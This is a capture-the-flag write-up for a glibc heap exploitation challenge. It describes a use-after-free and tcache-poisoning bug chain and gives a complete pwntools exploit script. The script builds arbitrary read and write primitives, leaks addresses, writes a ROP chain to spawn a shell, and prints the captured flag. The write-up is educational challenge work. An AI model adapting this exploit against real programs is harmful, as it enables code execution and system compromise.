---
date: '2025-12-10T14:34:57+05:30'
title: 'Heap Heap Hooray 2'

challenge-categories:
-   Binary Exploitation
-   Reverse Engineering
-   glibc heap
-   tcache poison

---

Who needs exit hooks when you can **ROP** on stack :rofl:

<!--more-->

## Problem Statement

Twist the heap just right and you might get the flag.

`nc challenges2.perfectroot.wiki 8002`

## Bugs

1. UAF to cause tcache poison
2. Heap buffer overflow to overwrite stored ptr

## Solve

1.  Allocate two items
2.  Free two items
3.  Get heap leak and poison tcache to return stored ptr address
4.  Use the chunk as an `arb addr read` and `arb addr write` primitives.
5.  Leak pie using AAR on heap
6.  Leak libc using AAR on got
7.  Leak stack using AAR on libc (`environ`)
8.  Egg hunt location of `__libc_start_call_main` on stack
9.  Craft ropchain w/ libc gadgets.
10. Write ropchain on stack
11. Exit
12. Pop shell!


```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from inspect import stack
from pwn import *

context.terminal = "tmux neww -a".split()

exe = context.binary = ELF(args.EXE or "./heap2")
libc = exe.libc
assert libc is not None


def start(argv=[], *a, **kw):
    if args.REMOTE:
        # parse things of this format 83.136.254.84:36100
        addr, port = args.REMOTE.split(":")
        return remote(addr, int(port))
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
continue
""".format(**locals())


io = start()
sla = io.sendlineafter
sa = io.sendafter
sl = io.sendline
ru = io.recvuntil
rl = io.recvline


def add(msg: bytes):
    sla(b"oice: ", b"1")
    sla(b"Enter message name: ", msg)
    ru(b"Message added at index ")
    return int(rl(keepends=False).strip().decode())


def dele(idx: int):
    sla(b"oice: ", b"2")
    sla(b"Index to delete: ", str(idx).encode())
    ru(b"Message name freed")


def edit(idx: int, msg: bytes):
    sla(b"oice: ", b"3")
    sla(b"Index to edit: ", str(idx).encode())
    sla(b"Enter new name: ", msg)
    # ru(b"=== Message Manager === ")


def show(idx: int):
    sla(b"oice: ", b"4")
    sla(b"Index to show: ", str(idx).encode())
    ru(b"Notification: ")
    return rl(keepends=False)


niceidx = add(b"nice")
viceidx = add(b"vice")

dele(niceidx)
dele(viceidx)

heapbase = u64(show(niceidx).ljust(8, b"\x00")) << 12
target = 0x2A0 + heapbase

# target = 0xDEADBEEFCAFEBABE

encd = target ^ (heapbase >> 12)
edit(viceidx, p64(encd))

dummyidx = add(b"dummy")
ptridx = add(b"ptr")


# arbitrary address read primitive
def aar(addr) -> bytes:
    edit(ptridx, p64(addr))
    leak = show(niceidx)
    return leak


# arbitrary address write primitve
def aaw(addr, data: bytes):
    edit(ptridx, p64(addr))
    edit(niceidx, data)


pie_addr_at = heapbase + 0x2B0
pieaddr = aar(pie_addr_at)
pieaddr = u64(pieaddr.ljust(8, b"\x00"))
exe.address = pieaddr - exe.sym["default_notify"]

got_addr = exe.got["puts"]
put_addr = aar(got_addr)
put_addr = u64(put_addr.ljust(8, b"\x00"))
libc.address = put_addr - libc.sym["puts"]

stack_addr = aar(libc.sym["environ"])
stack_addr = u64(stack_addr.ljust(8, b"\x00"))
egg = libc.address + 0x29D90


def egghunt(start, egg):
    for i in range(0, 0x1000, 8):
        addr = start - i
        at_addr = aar(addr)
        at_addr = at_addr[:8]
        at_addr = at_addr.ljust(8, b"\x00")
        at_addr = u64(at_addr)
        if at_addr == egg:
            return addr
    else:
        error("egghunt failed. maybe stick to something veg ....")


retaddr = egghunt(stack_addr, egg)

rop = ROP(libc)
rop.raw(rop.ret)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
info(rop.dump())

# __import__("ipdb").set_trace()
aaw(retaddr, bytes(rop))
sla(b"Choice:", b"5")
sl(b"cat flag.txt")
success(io.recvline_contains(b"{"))
```


## Flag

```
r00t{Pwn1n9_w1th_3x1t_func5_15_c00l_a9de653}
```
